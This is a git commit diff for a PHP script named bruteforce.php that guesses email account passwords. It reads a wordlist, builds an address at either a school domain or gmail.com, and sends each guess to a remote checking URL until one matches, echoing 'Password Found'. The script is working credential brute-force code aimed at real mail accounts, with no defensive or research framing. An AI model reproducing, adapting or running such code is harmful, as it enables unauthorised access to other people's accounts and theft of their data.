c5a64e35c65ef7a7d4277d41860c0b857299b9eb
Pizzaroot <therealpizzaroot@gmail.com>
2016-09-06 16:36:57 +0400

    File
    File

--- bruteforce.php
+++ bruteforce.php
@@ -1,16 +1,31 @@
 <?php
 // Get a file into an array.  In this example we'll go through HTTP to get
 // the HTML source of a URL.
-$passwords = file('easypass.txt');
-$email = $_GET['email'];
-$password = $passwords[0];
-$passright = file_get_contents('http://raha.pizzaroot.netne.net/check_mb_password.php?login='.$email.'&password='.$password);
-if ($passright == 1)
+$passwords = file('phpbb.txt');
+$email = $_POST['email'];
+if ($_POST['email2'] == 'raha')
 {
-	echo 'Password Found: '.$password;
+	$email2 = 'raha-international-school.org';
 }
 else
 {
-	echo 'Password Not Match: '.$password;
+	$email2 = 'gmail.com';
+}
+for ($i = 0; $i < sizeof($passwords); $i++)
+{
+	$password = $passwords[$i];
+	$passright = file_get_contents('http://raha.pizzaroot.comli.com/check_mb_password.php?login='.$email.'@'.$email2.'&password='.$password);
+	if ($passright == 1)
+	{
+		echo 'Password Found: '.$password;
+		break;
+	}
+	else
+	{
+		echo 'Password Not Match: '.$password;
+	}
+	echo '<br>';
+	ob_flush();
+	flush();
 }
 ?>
